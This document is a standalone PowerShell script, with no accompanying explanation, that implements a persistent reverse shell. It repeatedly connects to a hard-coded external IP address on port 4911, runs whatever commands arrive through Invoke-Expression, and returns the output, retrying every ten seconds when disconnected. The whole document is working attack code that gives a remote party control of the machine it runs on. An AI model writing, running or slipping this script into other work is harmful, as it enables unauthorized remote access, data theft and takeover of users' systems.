while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient
        $client.Connect("67.183.186.191", 4911)

        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)
            $writer.AutoFlush = $true

            $prompt = "PS " + (pwd).Path + "> "
            $writer.WriteLine("Connected: $prompt")

            while ($client.Connected -and $stream.CanRead) {
                try {
                    $data = $reader.ReadLine()
                    if ($data -eq "exit") { break }

                    $result = iex $data 2>&1 | Out-String
                    $response = $result + "`n" + $prompt
                    $writer.WriteLine($response)
                } catch {
                    $writer.WriteLine("Error: $_")
                    break
                }
            }

            # Cleanup
            $reader.Close()
            $writer.Close()
            $stream.Close()
            $client.Close()
        }
    } catch {
        # Optional logging for local debugging:
        # Add-Content -Path "$env:TEMP\revshlog.txt" -Value "[$(Get-Date)] Error: $_"
    }

    Start-Sleep -Seconds 10
}
